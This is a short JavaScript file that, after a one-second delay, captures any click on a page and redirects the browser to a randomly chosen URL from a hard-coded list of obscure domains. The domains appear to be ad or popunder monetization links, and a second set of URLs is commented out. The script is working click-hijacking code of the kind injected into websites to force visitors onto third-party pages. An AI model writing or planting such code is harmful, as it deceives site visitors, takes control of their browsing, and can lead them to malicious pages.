function init() {
  var arr = [
    // hil: db
    // "https://grim-package.com/bP3/VK0iP.3_p/vvbwmKV/J/ZlDB0T1dMuTCkl5/N/DmAjwOL/TtUIxtODTtka0dMYDsEP",
    // "https://grim-package.com/bj3.Vm0APJ3LpgvibhmmViJFZ/De0/1mMATrk/5mN-DWAn4/L/TfU/x/ORTski0qMuDqkj",
    // "https://grim-package.com/b.3WVQ0DPn3Lp/vJbQmyVVJsZlDH0/1PM-zLEM0KO/TJUl5XLcTAUxzDMjTNQU5GN/jlAH",

    // "https://grim-package.com/bP3/Vq0/P.3/p/vRb/mFVRJqZWDS0F1zMez/MmxqNyjPEHzgL-TkUHzgM/zxE/2wMAT/QC",
    // "https://grim-package.com/bd3vV.0UPV3Dpjv/b/mDVzJBZLD/0_1JMYzeMQzbM/TQME1eLjTrUJzjM/zcMdxqMjzjYx",
    // "https://grim-package.com/be3.V_0pPC3kpEvdbXm/VCJCZpDu0j1-M/zHcw5/MWjSUp2tLfTaUWzENqzbkTyJNXTkch",
    // "https://grim-package.com/bG3wV.0RP-3_p-vObimZVkJmZ/DW0M1bMMzwc/5lM/j/Yu0UL/T/UVz/NCzmk/yINfj/UE",
    // "https://grim-package.com/bM3IV.0SPI3uplvzbHmXVKJXZ/Dl0-1IM/zXcs5/Mfj/cAyqLaTMULzSN/zzkUyTNBzCMF",

    // mon: db
    "https://thelrourg.net/4/7237942",
    "https://woafoame.net/4/7237941",
    "https://corgouzaptax.com/4/7474716",
    "https://eeptoabs.com/4/7420689",
    "https://thechoansa.com/4/7237907",

    "https://psomtenga.net/4/7420696",
    "https://kaushooptawo.net/4/7237921",
    "https://vekseptaufin.com/4/7420698",
    "https://thomtubsaro.com/4/7436813",
    "https://grushoungy.com/4/7614690",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);